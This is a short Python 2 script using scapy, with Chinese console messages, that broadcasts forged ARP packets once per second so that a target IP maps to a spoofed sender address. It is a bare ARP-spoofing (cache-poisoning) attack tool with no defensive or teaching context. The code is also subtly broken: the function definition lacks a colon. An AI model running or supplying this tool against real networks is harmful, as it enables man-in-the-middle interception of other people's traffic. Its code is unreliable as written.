import sys
import time
from scapy.all import *

def arpspoof(target,ip)
    try:
        message=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=target,psrc=ip)
        sendp(message)
        return
    except:
        return

def main():
    if len(sys.argv)!=3:
        print "请输入正确的参数"
        sys.exit()

    target=str(sys.argv[1]).strip()
    ip=str(sys.argv[2]).strip()
    
    while True:
        try:
            arpspoof(target,ip)
            time.sleep(1)
        except KeyboardInterrupt:
            print "结束ARP欺骗"
            break

if __name__=='__main__':
    main()